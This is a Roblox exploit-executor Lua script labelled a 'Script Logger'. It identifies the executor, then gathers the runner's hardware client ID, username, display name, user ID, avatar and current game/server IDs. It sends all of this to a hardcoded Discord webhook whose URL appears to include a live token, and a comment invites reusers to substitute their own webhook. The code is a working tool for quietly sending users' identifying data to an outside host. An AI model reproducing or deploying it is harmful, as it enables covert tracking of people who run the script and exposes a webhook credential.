local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local player = game.Players.LocalPlayer
local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or --[[ syn and "Synapse X"  or]]
    secure_load and "Sentinel" or
  --[[  KRNL_LOADED and "Krnl/OxygenU" or
    getexecutorname() and "Scriptware" or]]
    fluxus.request() and "Fluxus"

print(webhookcheck)
local url = "https://discord.com/api/webhooks/938849487613480960/-Ymr85W76zxDHpsh0lhYYgF7opbCjHT0rEAdu1wmwo55_z4sJ5QC2eDW_QV1rWxnxtVd" -- Replace this with your webhook. I DO NOT recommend discord webhooks because they can be sniffed anyway. Use websec (discord bot to secure webhooks) or host a webserver otherwise
local data = {
   ["username"] = "Script Logger momento lol",
   ["content"] = "To Join The User Press This Link (https://web.roblox.com/home?placeID="..game.PlaceId.."&gameID"..game.JobId..")  \n \n To join the player using this link, install this plugin, it has other features btw. (https://chrome.google.com/webstore/detail/rogold/mafcicncghogpdpaieifglifaagndbni) or just fucking use SearchBlox smh. Imagine learning how to script BUT NOT KNOWING HOW TO FUCKING USE SEARCHBLOX",
   ["embeds"] = {
       {
           ["author"] = {
                            ["name"] = "tech is cool",
                            ["url"] = "https://www.roblox.com/groups/5756213/Gaming-Development-Studios#!/about",
                            ["icon_url"] = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
                        },
            ["footer"] = {
                            ["text"] = "Mia is also cool",
                            ["icon_url"] = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
                        },
           ["title"] = "**someone executed script**",
          --["description"] = "Displayname: **"..yourmum.."** \n Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."**",
           ["description"] = string.format((game:GetService("RbxAnalyticsService"):GetClientId())..'\nProfile: https://roblox.com/users/%d/profile\nUsername:** %s\n**DisplayName: **%s**\nUserID: **%d**\n Executor: **'..webhookcheck..'** \n GameID: **'..game.PlaceId..'** \n GameName: **'..GetName.Name..'** \n Avatar/Pfp:', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or ' N/A '), player.UserId),
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
           }
       }
   }
}


local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

-- nil I guess? ¯\_(ツ)_/¯
